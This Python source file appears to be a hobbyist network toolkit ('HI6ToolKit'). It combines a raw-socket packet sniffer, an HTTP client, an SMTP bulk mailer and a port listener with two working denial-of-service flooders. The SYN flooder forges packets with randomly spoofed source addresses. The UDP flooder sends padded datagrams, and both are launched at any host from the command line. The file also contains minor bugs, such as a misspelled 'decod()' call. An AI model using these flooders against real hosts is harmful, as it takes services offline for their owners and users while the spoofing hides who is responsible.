import socket
import concurrent.futures
import struct
import base64
import binascii
import argparse
import platform
import datetime
import random
import time
import sys
import ssl
import os

art = f"""


                        :::!~!!!!!:.
                .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:
            :!!!!!!?H! :!$!$$$$$$$$$$8X:
            !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
            :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
            ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
            !:~~~ .:!M"T#$$$$WX??#MRRMMM!
            ~?WuxiW*`   `"#$$$$8!!!!??!!!
            :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
        :!`.-   ~T$$$$8xx.  .xWW- ~""##*".
.....   -~~:<` !    ~?T#$$@@W@*?$$      /
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~  : : ?$$$B$Wu("**$RM!
$R@i.~~ !  :  :   ~$$$$$B$$en:``
?MXT@Wx.~-~-~:      "##*$$$$M~


 _    _  _____    __  _______              _  _  __ _  _   
| |  | ||_   _|  / / |__   __|            | || |/ /(_)| |  
| |__| |  | |   / /_    | |    __    ___  | || ' /  _ | |_ 
|  __  |  | |  |  _ \   | |  / _ \  / _ \ | ||  <  | || __|
| |  | | _| |_ | (_) |  | | | (_) || (_) || || . \ | || |_ 
|_|  |_||_____| \___/   |_|  \___/  \___/ |_||_|\_\|_| \__|


HI6ToolKit Copyright (C) 2023 HI6Cypher

[System] : [{platform.platform()}] [{platform.processor()}]
[Hostname] : [{platform.node()}]
[Python] : [{platform.python_implementation()} {platform.python_version()}]

[GitHub] : [github.com/HI6Cypher]
[Email] : [huaweisclu31@hotmail.com]


"""


class Sniff :
    def __init__(self, host, proto) :
        self.host = host
        self.proto = proto
        self.ioctl = True if platform.system() == "Windows" else False
        self.__content = str()
        self.__raw_buffer = b""
        self.time = datetime.datetime.today()

    def __IPheader(self, raw_payload) :
        payload = struct.unpack("!BBHHHBBH4s4s", raw_payload)
        ver = payload[0] >> 4
        ihl = (payload[0] & 0xf) * 4
        tos = payload[1]
        tlen = payload[2]
        iden = payload[3]
        flags = payload[4] >> 13
        offset = payload[4] & 0x1fff
        ttl = payload[5]
        protos = {1: "ICMP", 2: "IGMP", 6: "TCP", 17: "UDP"}
        proto = protos[payload[6]] if payload[6] in protos.keys() else payload[6]
        csum = hex(payload[7])
        src = socket.inet_ntop(socket.AF_INET, payload[8])
        dest = socket.inet_ntop(socket.AF_INET, payload[9])
        return ver, ihl, tos, tlen, iden, flags, \
            offset, ttl, proto, csum, src, dest

    def __ICMPheader(self, raw_payload) :
        payload = struct.unpack("!BBHHH", raw_payload[:8])
        typ = payload[0]
        code = payload[1]
        csum = hex(payload[2])
        iden = payload[3]
        sequ = payload[4]
        data = raw_payload[8:]
        return typ, code, csum, iden, sequ, data

    def __IGMPv1header(self, raw_payload) :
        payload = struct.unpack("!BBHL", raw_payload)
        version = payload[0] >> 4
        typ = payload[0] & 0xf
        csum = hex(payload[2])
        gr_ad = payload[3]
        data = raw_payload[8:]
        return version, typ, csum, gr_ad, data

    def __IGMPv2header(self, raw_payload) :
        payload = struct.unpack("!BBHL", raw_payload)
        typ = payload[0]
        mrtime = payload[1]
        csum = hex(payload[2])
        gr_ad = payload[3]
        data = raw_payload[8:]
        return typ, mrtime, csum, gr_ad, data

    def __TCPheader(self, raw_payload) :
        payload = struct.unpack("!HHLLBBHHH", raw_payload[:20])
        srcp = payload[0]
        destp = payload[1]
        sequ = payload[2]
        ackn = payload[3]
        offset = (payload[4] >> 4) * 4
        flags = payload[5]
        urg = (flags & 32) >> 5
        ack = (flags & 16) >> 4
        psh = (flags & 8) >> 3
        rst = (flags & 4) >> 2
        syn = (flags & 2) >> 1
        fin = flags & 0x1
        flags = (urg, ack, psh, rst, syn, fin)
        win = payload[6]
        csum = hex(payload[7])
        urgp = payload[8]
        data = raw_payload[offset:]
        return srcp, destp, sequ, ackn, offset, flags, \
            win, csum, urgp, data

    def __UDPheader(self, raw_payload) :
        payload = struct.unpack("!HHHH", raw_payload[:8])
        srcp = payload[0]
        destp = payload[1]
        tlen = payload[2]
        csum = hex(payload[3])
        data = raw_payload[8:]
        return srcp, destp, tlen, csum, data

    def __proto(self) :
        if platform.system() == "Windows" and self.proto == socket.IPPROTO_TCP :
            raise OSError("[WinError 10022] An invalid argument was supplied")
        if platform.system() == "Linux" and self.proto == socket.IPPROTO_IP or self.proto == socket.IPPROTO_RAW :
            raise OSError("[WinError 10022] An invalid argument was supplied")
        return self.proto

    def __writedata(self, data) :
        counter = 1
        data = str(data).split("\\")
        text = "\t\t\t"
        for i in data :
            if counter % 10 != 0 :
                text += f"{i}\\"
            else :
                text += f"{i}\n\t\t\t\\"
            counter += 1
        text += "\n\n\n"
        return text

    def __analysis_proto(self, iph, counter) :
        t = "\n\t\t"
        time = datetime.datetime.today()
        self.__content += f"[*][{counter}] Connection________[{time.strftime('%Y%m%d%H%M%S')}]________\n\n"
        text = f"\tIPv4 Packet :{t}Version : {iph[0]}  Header Length : {iph[1]}  Time of Service : {iph[2]}"
        text += f"{t}Total Length : {iph[3]}  Identification : {iph[4]}  Flags : {iph[5]}"
        text += f"{t}Fragment Offset : {iph[6]}  TTL : {iph[7]}  Protocol : {iph[8]}"
        text += f"{t}Checksum : {iph[9]}  Source : {iph[10]}  Destination : {iph[11]}"
        self.__content += text + "\n\n"

        if iph[8] == "ICMP" :
            typ, code, csum, iden, sequ, data = self.__ICMPheader(self.__raw_buffer[iph[1]:])
            text = f"\tICMP Packet :{t}Type : {typ}{t}Code : {code}{t}Checksum : {csum}{t}Identifier : {iden}{t}Sequence : {sequ}{t}Raw Data :\n{self.__writedata(data)}"
            self.__content += text + "\n"

        elif iph[8] == "IGMP" :
            check = int(binascii.hexlify(self.__raw_buffer[iph[1]:]).decode()[:2])
            if check in [16, 17] :
                typ, mrtime, csum, gr_ad, data = self.__IGMPv2header(self.__raw_buffer[iph[1]:])
                text = f"\tIGMPv2 Packet :{t}Type : {typ}{t}Max Response Time : {mrtime}{t}Checksum : {csum}{t}Group Address : {gr_ad}{t}Raw Data : \n{self.__writedata(data)}"
                self.__content += text + "\n"
            elif check == 12 :
                version, typ, csum, gr_ad, data = self.__IGMPv1header(self.__raw_buffer[iph[1]:])
                text = f"\tIGMPv1 Packet :{t}Version : {version}{t}Type : {typ}{t}Checksum : {csum}{t}Group Address : {gr_ad}{t}Raw Data : \n{self.__writedata(data)}"
                self.__content += text + "\n"

        elif iph[8] == "TCP" :
            srcp, destp, sequ, ackn, offset, flags, win, csum, urgp, data = self.__TCPheader(self.__raw_buffer[iph[1]:])
            text = f"\tTCP Segment :{t}Source Port : {srcp}{t}Destination Port : {destp}{t}Sequence : {sequ}{t}Acknowledgment : {ackn}{t}Data Offset : {offset}{t}Flags :{t}"
            self.__content += text + "\t"
            text = f"URG:{flags[0]}  ACK:{flags[1]}  PSH:{flags[2]}{t}\tRST:{flags[3]}  SYN:{flags[4]}  FIN:{flags[5]}"
            self.__content += text + t
            text = f"Window : {win}{t}Checksum : {csum}{t}Urgent Pointer : {urgp}{t}Raw Data :\n{self.__writedata(data)}"
            self.__content += text

        elif iph[8] == "UDP" :
            srcp, destp, tlen, csum, data = self.__UDPheader(self.__raw_buffer[iph[1]:])
            text = f"\tUDP Datagram :{t}Source Port : {srcp}{t}Destination Port : {destp}{t}Length : {tlen}{t}Checksum : {csum}{t}Raw Data :\n{self.__writedata(data)}"
            self.__content += text + "\n"
        return

    def __save(self) :
        path = f"data{self.time.strftime('%Y%m%d%H%M%S')}.txt"
        mode = "a" if os.path.exists(path) else "x"
        with open(path, mode) as file :
            file.write(self.__content)
        return

    def sniff(self) :
        try :
            with socket.socket(socket.AF_INET, socket.SOCK_RAW, self.__proto()) as sniff :
                sniff.bind((self.host, 0))
                sniff.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                sniff.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON) if self.ioctl else None
                print(art)
                counter = 1
                try :
                    while True :
                        self.__content = str()
                        self.__raw_buffer = sniff.recvfrom(65535)[0]
                        iph = self.__IPheader(self.__raw_buffer[0:20])
                        self.__analysis_proto(iph, counter)
                        self.__content = self.__content.expandtabs(4)
                        print(self.__content)
                        self.__save()
                        counter += 1
                except KeyboardInterrupt :
                    sniff.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF) if self.ioctl else None
                    sys.exit(1)
        except Exception as error :
            print(f"[!] Error - {error or None}")
        return


class DoS_SYN :
    def __init__(self, host, port, rate) :
        self.host = socket.gethostbyname(host)
        self.port = int(port) if not isinstance(port, int) else port
        self.rate = int(rate) if not isinstance(rate, int) else rate
        self.socket_protocol = socket.IPPROTO_TCP if platform.system() != "Windows" else socket.IPPROTO_IP
        self.randip = str()
        self.symbol = chr(9608)

    def __ip_header(self, version = 4, ihl = 5, tos = 0, 
                tlen = 40, iden = 43981, flags = 0, offset = 0, 
                ttl = 255, proto = socket.IPPROTO_TCP, csum = 0) :
        ihl_version = (version << 4) + ihl
        flags_offset = (flags << 13) + offset
        self.randip = self.__random_ip()
        src = socket.inet_pton(socket.AF_INET, self.randip)
        dest = socket.inet_pton(socket.AF_INET, self.host)
        packet = struct.pack("BBHHHBBH4s4s", ihl_version, tos, tlen, iden, 
                        flags_offset, ttl, proto, csum, src, dest)
        return packet

    def __tcp_header(self, srcp = 1337, destp = 0, sequ = 0, 
                ackn = 0, offset = 5, urg = 0, ack = 0, psh = 0, 
                rst = 0, syn = 0, fin = 0, win = 8192, csum = 0, urgp = 0) :
        offset = offset << 4
        flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
        packet = struct.pack("HHLLBBHHH", srcp, destp, sequ, ackn, offset, 
                        flags, win, csum, urgp)
        return packet

    def __pseudo_header(self, reserved = 0, proto = socket.IPPROTO_TCP, tcplen = 0) :
        src = socket.inet_pton(socket.AF_INET, self.randip)
        dest = socket.inet_pton(socket.AF_INET, self.host)
        packet = struct.pack("4s4sBBH", src, dest, reserved, proto, tcplen)
        return packet
        
    def checksum(self, data):
        checksum = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i+1]
            checksum += word
        checksum = (checksum >> 16) + (checksum & 0xffff)
        checksum = (~checksum) & 0xffff
        return checksum

    def __random_ip(self) :
        sections = [str(random.randint(1, 255)) for _ in range(0, 4)]
        return ".".join(sections)

    def __prepare(self) :
        ip_header = self.__ip_header()
        ip_header = self.checksum(ip_header)
        ip_header = self.__ip_header(csum = ip_header)
        tcp_header = self.__tcp_header(destp = self.port, syn = 1)
        pseudo_header = self.__pseudo_header(tcplen = len(tcp_header))
        data = tcp_header + pseudo_header
        tcp_checksum = self.checksum(data)
        tcp_header = self.__tcp_header(destp = self.port, syn = 1, csum = tcp_checksum)
        payload = ip_header + tcp_header
        return payload

    def flood(self, module = False) :
        try :
            if not module :
                print(art)
                input("\nPress anykey to continue...\n")
        except KeyboardInterrupt :
            sys.exit(1)
        with concurrent.futures.ThreadPoolExecutor() as task :
            task.submit(self.__flood())
        return

    def __flood(self) :
        start_time = time.time()
        self.rate += 32
        while self.rate % 32 != 0 :
            self.rate += 1
        section = self.rate // 32
        constant = section
        try :
            for i in range(1, self.rate + 1) :
                payload = self.__prepare()
                with socket.socket(socket.AF_INET, socket.SOCK_RAW, self.socket_protocol) as flood :
                    flood.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    flood.sendto(payload, (self.host, self.port))
                    flood.shutdown(socket.SHUT_RDWR)
                    if i == section :
                        print(f"[+] {self.symbol}  {section} packets sent", end = "\r", flush = True)
                        section += constant
                        self.symbol += chr(9608)
            else :
                time.sleep(2)
                end_time = round((time.time() - start_time), 2)
                print("\n[+] All packets have sent")
                print(f"[-] {end_time}s")
        except KeyboardInterrupt :
            sys.exit(1)
        except Exception as error :
            print(f"[!] Error - {error or None}")
        return


class DoS_UDP(DoS_SYN) :
    def __init__(self, host, port, rate, packet_size) :
        super().__init__(host, port, rate)
        self.packet_size = int(packet_size) if not isinstance(packet_size, int) else packet_size
        self.payload = b""

    def flood(self, module = False) :
        try :
            if not module :
                print(art)
                input("\nPress anykey to continue...\n")
        except KeyboardInterrupt :
            sys.exit(1)
        with concurrent.futures.ThreadPoolExecutor() as task :
            task.submit(self.__flood())
        return

    def __flood(self) :
        start_time = time.time()
        self.rate += 32
        while self.rate % 32 != 0 :
            self.rate += 1
        section = self.rate // 32
        constant = section
        while self.packet_size > len(self.payload) :
            self.payload += f"[HI6Cypher]".encode()
        try :
            for i in range(1, self.rate + 1) :
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as flood :
                    flood.settimeout(60)
                    flood.sendto(self.payload, (self.host, self.port))
                    if i == section :
                        print(f"[+] {self.symbol}  {section} packets sent", end = "\r", flush = True)
                        section += constant
                        self.symbol += chr(9608)
            else :
                time.sleep(2)
                end_time = round((time.time() - start_time), 2)
                print("\n[+] All packets have sent")
                print(f"[-] {end_time}s")
        except KeyboardInterrupt :
            sys.exit(1)
        except Exception as error :
            print(f"[!] Error - {error or None}")
        return


class HTTP_Request :
    def __init__(self, host, port, end, decode, https) :
        self.host = host
        self.port = int(port) if not isinstance(port, int) else port
        self.end = end if end else "/"
        self.decode = bool(decode) if not isinstance(decode, bool) else decode
        self.https = bool(https) if not isinstance(https, bool) else https
        self.symbol = chr(9608)

    def request(self, module = False) :
        try :
            if not module :
                print(art)
                input("\nPress anykey to continue...\n")
        except KeyboardInterrupt :
            sys.exit(1)
        with concurrent.futures.ThreadPoolExecutor() as task :
            task.submit(self.__request())
        return

    def __request(self) :
        try :
            sslcontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2) if self.https is True else None
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as flood :
                flood = sslcontext.wrap_socket(flood, server_hostname = self.host) if self.https is True else flood
                payload = [
                            f"GET {self.end} HTTP/1.1", 
                            f"Host: {self.host}", 
                            "User-Agent: HI6ToolKit", 
                            "Accept: */*", 
                            "Connection: close", 
                            "\r\n"]
                payload = "\r\n".join(payload)
                print(payload)
                flood.settimeout(30)
                flood.connect((self.host, self.port))
                flood.send(payload.encode())
                raw_data = b""
                counter = 0
                space = str()
                while True :
                    response = flood.recv(4096)
                    if not response :
                        raw_data = raw_data.split(b"\r\n\r\n", 1)
                        header = raw_data[0]
                        data = raw_data[-1]
                        print(28 * chr(32), end = "\n")
                        print(header.decode() if isinstance(header, bytes) else header, end = "\n\n")
                        print(data.decode() if self.decode else data)
                        flood.close()
                        break
                    else :
                        if counter != 16 :
                            print(f"{self.symbol} Downloading", end = "\r", flush = True)
                            counter += 1
                            self.symbol += chr(9608)
                            space += 2 * chr(32)
                        else :
                            print(space, end = "\r", flush = True)
                            counter = 0
                            self.symbol = chr(9608)
                            space = str()
                        raw_data += response
        except KeyboardInterrupt :
            sys.exit(1)
        except Exception as error :
            print(f"[!] Error - {error or None}")
        return


class SendEmail :
    def __init__(self, smtp, sender, sender_password, recipients, subject, text) :
        self.smtp = smtp
        self.sender = sender
        self.sender_password = sender_password
        self.recipients = recipients.split()
        self.subject = subject
        self.text = text

    def sendemail(self, module = False) :
        try :
            if not module :
                print(art)
                input("\nPress anykey to continue...\n")
        except KeyboardInterrupt :
            sys.exit(1)
        print(f"[*] setting up socket : socket.SOCK_STREAM")
        with concurrent.futures.ThreadPoolExecutor() as task :
            task.submit(self.__wrap(self.smtp, self.sender, self.sender_password,
                self.recipients, self.subject, self.text))
        return

    def __send(self, socket, payload) :
        socket.sendall(payload.encode())
        return

    def __recv(self, socket) :
        return socket.recv(4096).decode()

    def __ehlo(self, socket, server) :
        ehlo_message = f"EHLO {server}\r\n"
        self.__send(socket, ehlo_message)
        return

    def __authentication(self, socket, username, password) :
        self.__send(socket, "AUTH LOGIN\r\n")
        self.__recv(socket)
        username = base64.b64encode(username.encode()).decode() + "\r\n"
        self.__send(socket, username)
        self.__recv(socket)
        print("[*] send base64 of username")
        password = base64.b64encode(password.encode()).decode() + "\r\n"
        self.__send(socket, password)
        response = self.__recv(socket).split()
        print("[*] send base64 of password")
        if response[0] == "235" :
            print(f"[+] {response[-2]} {response[-1]} ({response[0]})")
            return True
        else :
            print(f"[-] authentication failed")
            print(f"[-] check username and password then try again")
        return False

    def __mailing(self, socket, sender, recipient, subject, text) :
        from_message = f"MAIL FROM: {sender}\r\n"
        self.__send(socket, from_message)
        response_fm = self.__recv(socket).split()
        if response_fm[0] == "250" :
            print(f"[+] {response_fm[-2]} {response_fm[-1]} ({response_fm[0]})")
        else :
            print(f"[-] we've got problem here ({response_fm[0]})")
        rcpt_message = f"RCPT TO: {recipient} \r\n"
        self.__send(socket, rcpt_message)
        response_rm = self.__recv(socket).split()
        if response_rm[0] == "250" :
            print(f"[+] {response_rm[-2]} {response_rm[-1]} ({response_rm[0]})")
        else :
            print(f"[-] we've got problem here ({response_rm[0]})")
        self.__send(socket, "DATA\r\n")
        subject_message = f"Subject: {subject}\r\n"
        self.__send(socket, subject_message)
        text = f"\r\n{text}\r\n.\r\n"
        self.__send(socket, text)
        self.__recv(socket)
        response_fi = self.__recv(socket).split()
        if response_fm[0] == "250" :
            print(f"[+] {response_fi[-3]} ({response_fi[0]})")
            print(f"[+] {response_fi[-2]}")
            print(f"[+] {response_fi[-1]}")
        else :
            print(f"[-] we've got problem here ({response_fi[0]})")
        return

    def __wrap(self, smtp_server, sender, sender_password, recipients, subject, text) :
        try :
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as mail :
                print(f"[*] connecting to the {smtp_server}")
                mail.connect((smtp_server, 587))
                conn = mail.recv(1024)
                if conn.decode().startswith("220") :
                    print(f"[+] server {smtp_server} is ready")
                else :
                    print(f"[-] server {smtp_server} isn't ready")
                    mail.close()
                self.__ehlo(mail, smtp_server)
                self.__recv(mail)
                print(f"[*] sending ehlo to the server {smtp_server}")
                self.__send(mail, "STARTTLS\r\n")
                self.__recv(mail)
                print("[*] starting TLS connection")
                print("[*] wraping socket with TLS connection")
                ssl_conn = ssl.create_default_context()
                with ssl_conn.wrap_socket(sock = mail, server_hostname = smtp_server) as protomail :
                    print("[+] socket successfully wraped")
                    print(f"[*] sending ehlo to the server {smtp_server} on TLS connection")
                    self.__ehlo(protomail, smtp_server)
                    self.__recv(protomail)
                    print("[*] authenticating...")
                    auth = self.__authentication(protomail, sender, sender_password)
                    if auth :
                        for recipient in recipients :
                            print(f"[*] sending email to {recipient}")
                            self.__mailing(protomail, sender, recipient, subject, text)
                        else :
                            print(f"[*] sending QUIT to {smtp_server}")
                            self.__send(protomail, "QUIT")
                    else :
                        sys.exit(1)
        except KeyboardInterrupt :
            sys.exit(1)
        except Exception as error :
            print(f"[!] Error - {error or None}")
        return


class Listen :
    def __init__(self, host, port, timeout, proto) :
        self.host = host
        self.port = int(port) if not isinstance(port, int) else port
        self.timeout = int(timeout) if not isinstance(timeout, int) else timeout
        self.proto = proto
        self.all_data = str()
        self.time = datetime.datetime.today()

    def __save(self) :
        path = f"data{self.time.strftime('%Y%m%d%H%M%S')}.txt"
        mode = "a" if os.path.exists(path) else "x"
        with open(path, mode) as file :
            file.write(self.all_data.replace("\r", ""))
        return

    def listen(self, module = False) :
        try :
            if not module :
                print(art)
                input("\nPress anykey to continue...\n")
        except KeyboardInterrupt :
            sys.exit(1)
        counter = 1
        try :
            with socket.socket(socket.AF_INET, self.proto) as listen :
                listen.settimeout(self.timeout)
                listen.bind((self.host, int(self.port)))
                listen.listen(5) if self.proto == socket.SOCK_STREAM else None
                try :
                    while True :
                        time = datetime.datetime.today()
                        time = time.strftime('%Y%m%d%H%M%S')
                        conn, address = listen.accept() if self.proto == socket.SOCK_STREAM else listen.recvfrom(1024)
                        payload = conn.recv(1024) if self.proto == socket.SOCK_STREAM else conn
                        text = f"\n[{counter}][{time}] connection from {address}\n"
                        print(text)
                        if payload :
                            self.all_data += text + payload.decode()
                            self.__save()
                            print(payload.decod())
                            counter += 1
                            self.all_data = str()
                except KeyboardInterrupt :
                    sys.exit(1)
        except Exception as error :
            print(f"[!] Error - {error or None}")
        return

if __name__ == "__main__" :
    info = "[GitHub] : github.com/HI6Cypher [Email] : huaweisclu31@hotmail.com"
    os.system("clear || cls")
    def manage_args() :
        parser = argparse.ArgumentParser(prog = "HI6ToolKit", epilog = info, add_help = True)
        parser.add_argument("Tool", type = str, help = "To specify tool [SNIFF, DOS, HTTP, EMAIL, LISTEN]")
        parser.add_argument("-m", "--method", type = str, help = "To specify method of tool")
        parser.add_argument("-x", "--host", type = str, help = "To specify host")
        parser.add_argument("-p", "--port", type = int, help = "To specify port")
        parser.add_argument("-e", "--endpoint", type = str, help = "To specify endpoint")
        parser.add_argument("-d", "--decode", action = "store_true", help = "To specify decode boolean")
        parser.add_argument("-r", "--rate", type = int, help = "To specify rate")
        parser.add_argument("-s", "--size", type = int, help = "To specify packet size")
        parser.add_argument("-t", "--time", type = int, help = "To specify timeout")
        parser.add_argument("--smtp", type = str, help = "To specify SMTP server")
        parser.add_argument("--sender", type = str, help = "To specify sender email")
        parser.add_argument("--key", type = str, help = "To specify password of sender")
        parser.add_argument("--rcptpath", type = str, help = "To specify recipient file path")
        parser.add_argument("--subject", type = str, help = "To specify subject of email")
        parser.add_argument("--textpath", type = str, help = "To specify textfile of email")
        args = parser.parse_args()

        def help_message() :
            print(art)
            parser.print_help()
            return

        def PacketSniff_args(host, proto) :
            all = ["ALL", "All","all"]
            tcp = ["TCP", "Tcp", "tcp"]
            udp = ["UDP", "Udp", "udp"]
            icmp = ["ICMP", "Icmp", "icmp"]
            if proto in all :
                proto = socket.IPPROTO_IP
            elif proto in tcp :
                proto = socket.IPPROTO_TCP
            elif proto in udp :
                proto = socket.IPPROTO_UDP
            elif proto in icmp :
                proto = socket.IPPROTO_ICMP
            sniff = Sniff(host, proto)
            sniff.sniff()
            return

        def DoS_args(method, host, port, rate, size) :
            syn_names = ["SYN", "Syn", "syn"]
            udp_names = ["UDP", "Udp", "udp"]
            if method in syn_names :
                flood = DoS_SYN(host, port, rate)
                flood.flood()
            elif method in udp_names :
                flood = DoS_UDP(host, port, rate, size)
                flood.flood()
            else :
                help_message()
            return

        def HTTP_Request_args(host, port, endpoint, decode) :
            port = port if port else 80
            host = host if host else "127.0.0.1"
            client = HTTP_Request(host, port, endpoint, decode, https = False)
            client.request()

        def HTTPS_Request_args(host, port, endpoint, decode) :
            port = port if port else 443
            host = host if host else "127.0.0.1"
            client = HTTP_Request(host, port, endpoint, decode, https = True)
            client.request()

        def SendEmail_args(smtp, sender, sender_password, recipient_path, subject, text_path) :
            if os.path.exists(recipient_path) :
                with open(recipient_path) as file :
                    recitpients = file.read()
                with open(text_path) as file :
                    message = file.read()
                sendemail = SendEmail(smtp, sender, sender_password, recitpients, subject, message)
                sendemail.sendemail()
            else :
                print(f"[!] Error - {recipient_path} not found")
            return

        def Listen_args(host, port, timeout, proto) :
            protos = ["TCP", "Tcp", "tcp", "UDP", "Udp", "udp"]
            if proto in protos[:3] :
                proto = socket.SOCK_STREAM
            elif proto in protos[3:] :
                proto = socket.SOCK_DGRAM
            else :
                raise TypeError(f"{proto} is not in {protos}")
            listen = Listen(host, port, timeout, proto)
            listen.listen()
            return

        art_names = ["ART", "Art", "art"]
        sniff_names = ["SNIFF", "Sniff", "sniff"]
        dos_names = ["DOS", "DoS", "Dos", "dos"]
        http_names = ["HTTP", "Http", "http"]
        https_names = ["HTTPS", "Https", "https"]
        email_names = ["EMAIL", "Email", "email"]
        listen_names = ["LISTEN", "Listen", "listen"]

        if args.Tool in art_names :
            print(art)
        elif args.Tool in sniff_names :
            PacketSniff_args(args.host, args.method)
        elif args.Tool in dos_names :
            DoS_args(args.method, args.host, args.port, args.rate, args.size)
        elif args.Tool in http_names :
            HTTP_Request_args(args.host, args.port, args.endpoint, args.decode)
        elif args.Tool in https_names :
            HTTPS_Request_args(args.host, args.port, args.endpoint, args.decode)
        elif args.Tool in email_names :
            SendEmail_args(args.smtp, args.sender, args.key, args.rcptpath, args.subject, args.textpath)
        elif args.Tool in listen_names :
            Listen_args(args.host, args.port, args.time, args.method)
        else :
            help_message()
        return
    manage_args()